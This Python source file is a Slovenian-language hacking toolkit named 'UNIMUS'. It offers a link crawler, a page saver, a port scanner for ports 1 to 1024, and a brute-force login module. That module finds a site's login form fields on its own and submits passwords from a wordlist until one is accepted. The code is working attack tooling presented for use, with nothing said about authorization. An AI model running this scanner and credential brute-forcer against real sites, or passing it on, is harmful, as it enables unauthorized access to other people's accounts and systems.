import time
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
import socket
from urllib.parse import urljoin
import os

# Čiščenje terminala
os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    ascii_art = """
 @@@  @@@ @@@  @@@ @@@ @@@@@@@@@@  @@@  @@@  @@@@@@
 @@!  @@@ @@!@!@@@ @@! @@! @@! @@! @@!  @@@ !@@    
 @!@  !@! @!@@!!@! !!@ @!! !!@ @!@ @!@  !@!  !@@!! 
 !!:  !!! !!:  !!! !!: !!:     !!: !!:  !!!     !:!
  :.:: :  ::    :  :    :      :    :.:: :  ::.: : 
    """
    print(Fore.RED + ascii_art + Style.RESET_ALL)
    print(Fore.CYAN + "Welcome to UNIMUS. Created by Tartilupa.\n" + Style.RESET_ALL)

# 🕵️‍♂️ Skeniranje povezav (WEBTREE)
def get_links(url, base_url, visited=None, depth=2):
    if visited is None:
        visited = set()
    
    if depth == 0 or url in visited:
        return {}
    
    visited.add(url)
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
    except requests.RequestException:
        return {}
    
    soup = BeautifulSoup(response.text, "html.parser")
    links = {}

    for link in soup.find_all("a", href=True):
        full_link = urljoin(base_url, link["href"])
        if full_link.startswith(base_url) and full_link not in visited:
            print(f"🔗 Najdena povezava: {full_link}")
            links[full_link] = get_links(full_link, base_url, visited, depth - 1)
    
    return {url: links}

def package_webtree():
    url = input("Vnesi URL strani: ")
    print("🔍 Skeniram povezave...")
    tree = get_links(url, url, depth=2)
    print(tree)

# 💾 Shranjevanje strani (FREEZEWEB)
def freeze_web(url):
    print(f"📥 Shranjujem stran: {url}")
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        filename = url.replace("https://", "").replace("http://", "").replace("/", "_") + ".html"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(response.text)
        print(f"✅ Stran shranjena kot {filename}")
    except requests.RequestException:
        print(Fore.RED + "❌ Napaka pri shranjevanju strani!" + Style.RESET_ALL)

def package_freezeweb():
    url = input("Vnesi URL strani za shranitev: ")
    freeze_web(url)

# 🔎 Skeniranje portov
def scan_ports(target, ports):
    print(f"🔍 Skeniram {target} za odprte porte...")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(Fore.GREEN + f"🟢 Port {port} je odprt!" + Style.RESET_ALL)
        s.close()

def package_portscanner():
    target = input("Vnesi IP ali domeno: ")
    ports = list(range(1, 1025))  # Najbolj pogosti porti
    scan_ports(target, ports)

# 🔑 Brute-force prijava
def get_form_fields(url):
    """Poskuša najti prijavna polja avtomatsko"""
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")

        form = soup.find("form")
        if not form:
            print(Fore.RED + "❌ Ni bilo mogoče najti prijavnega obrazca!" + Style.RESET_ALL)
            return None, None

        inputs = form.find_all("input")
        user_field, pass_field = None, None

        for inp in inputs:
            field_name = inp.get("name") or inp.get("id")
            if not field_name:
                continue

            if "user" in field_name.lower() or "login" in field_name.lower():
                user_field = field_name
            elif "pass" in field_name.lower():
                pass_field = field_name

        return user_field, pass_field

    except requests.RequestException as e:
        print(Fore.RED + f"❌ Napaka pri pridobivanju polj: {e}" + Style.RESET_ALL)
        return None, None

def brute_force_login(url, username, wordlist, user_param=None, pass_param=None):
    """Brute-force napad z izboljšano zaznavo"""
    print(f"🔑 Napadam {url} z uporabnikom '{username}'")
    headers = {'User-Agent': 'Mozilla/5.0'}
    session = requests.Session()

    if not user_param or not pass_param:
        print(Fore.YELLOW + "🔍 Samodejno zaznavam vnosna polja..." + Style.RESET_ALL)
        user_param, pass_param = get_form_fields(url)

    if not user_param or not pass_param:
        print(Fore.RED + "❌ Ne najdem ustreznih vnosnih polj!" + Style.RESET_ALL)
        return

    print(Fore.YELLOW + f"📝 Uporabljam polja: {user_param} (username), {pass_param} (password)" + Style.RESET_ALL)

    with open(wordlist, "r", encoding="utf-8") as f:
        for password in f:
            password = password.strip()
            data = {user_param: username, pass_param: password}

            try:
                response = session.post(url, data=data, headers=headers, timeout=5)

                if "incorrect" in response.text.lower() or "invalid" in response.text.lower() or response.status_code == 401:
                    print(f"❌ Neuspešno: {password}")
                else:
                    print(Fore.GREEN + f"🔓 Prijava uspešna! Geslo: {password}" + Style.RESET_ALL)
                    return
            except requests.RequestException as e:
                print(Fore.RED + f"❌ Napaka: {e}" + Style.RESET_ALL)

    print(Fore.RED + "❌ Nobeno geslo ni delovalo." + Style.RESET_ALL)

def package_bruteforce():
    url = input("Vnesi URL prijavne strani: ")
    username = input("Vnesi uporabniško ime: ")
    wordlist = input("Vnesi pot do wordlista: ")

    user_param = input("Vnesi ID ali name polja za username (pusti prazno za samodejno zaznavo): ").strip() or None
    pass_param = input("Vnesi ID ali name polja za password (pusti prazno za samodejno zaznavo): ").strip() or None

    brute_force_login(url, username, wordlist, user_param, pass_param)

# 🌍 Glavni meni
def main():
    print_banner()
    
    while True:
        try:
            choice_main = input("root@localhost:~$ ").strip()
            
            if choice_main == "package webtree":
                package_webtree()
            elif choice_main == "package freezeweb":
                package_freezeweb()
            elif choice_main == "package portscanner":
                package_portscanner()
            elif choice_main == "package bruteforce":
                package_bruteforce()
            elif choice_main.lower() in ["exit", "quit"]:
                print("Exiting program...")
                break
            else:
                print(Fore.RED + "Neznan ukaz!" + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("\n⏹️ Uporabi 'exit' za izhod.")

if __name__ == "__main__":
    main()
